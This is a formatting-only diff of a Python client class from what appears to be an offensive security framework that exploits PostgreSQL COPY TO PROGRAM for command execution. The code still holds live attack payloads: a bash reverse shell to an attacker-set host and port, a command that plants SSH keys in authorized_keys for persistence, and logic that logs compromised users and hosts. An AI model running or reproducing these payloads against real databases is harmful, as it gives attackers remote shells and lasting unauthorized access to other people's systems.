@@ -108,8 +108,7 @@ class PostgreSQLCopyClient(BaseEngineClient):
                 ">> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
             ),
             "reverse_shell": (
-                f"bash -c 'bash -i >& /dev/tcp/{params.get('lhost', '127.0.0.1')}/"
-                f"{params.get('lport', 4444)} 0>&1' &"
+                f"bash -c 'bash -i >& /dev/tcp/{params.get('lhost', '127.0.0.1')}/{params.get('lport', 4444)} 0>&1' &"
             ),
             "cmd": params.get("command", "id"),
         }
@@ -190,10 +189,7 @@ class PostgreSQLCopyClient(BaseEngineClient):
         try:
             import psycopg2  # type: ignore[import]
         except ImportError as exc:
-            raise RuntimeError(
-                "psycopg2 is not installed. "
-                "Add psycopg2-binary to backend/requirements.txt."
-            ) from exc
+            raise RuntimeError("psycopg2 is not installed. Add psycopg2-binary to backend/requirements.txt.") from exc
 
         conn = psycopg2.connect(
             host=self.host,
@@ -231,22 +227,28 @@ class PostgreSQLCopyClient(BaseEngineClient):
             return facts
 
         if command in ("id", "whoami") or command.startswith("id "):
-            facts.append({
-                "category": "credential",
-                "trait": "credential.pgsql_rce_user",
-                "value": output[:200],
-            })
+            facts.append(
+                {
+                    "category": "credential",
+                    "trait": "credential.pgsql_rce_user",
+                    "value": output[:200],
+                }
+            )
         elif "uname" in command:
-            facts.append({
-                "category": "host",
-                "trait": "host.os",
-                "value": output[:200],
-            })
+            facts.append(
+                {
+                    "category": "host",
+                    "trait": "host.os",
+                    "value": output[:200],
+                }
+            )
         elif "authorized_keys" in command:
-            facts.append({
-                "category": "host",
-                "trait": "host.persistence",
-                "value": f"SSH authorized key added via pgsql COPY-TO-PROGRAM on {self.host}",
-            })
+            facts.append(
+                {
+                    "category": "host",
+                    "trait": "host.persistence",
+                    "value": f"SSH authorized key added via pgsql COPY-TO-PROGRAM on {self.host}",
+                }
+            )
 
         return facts
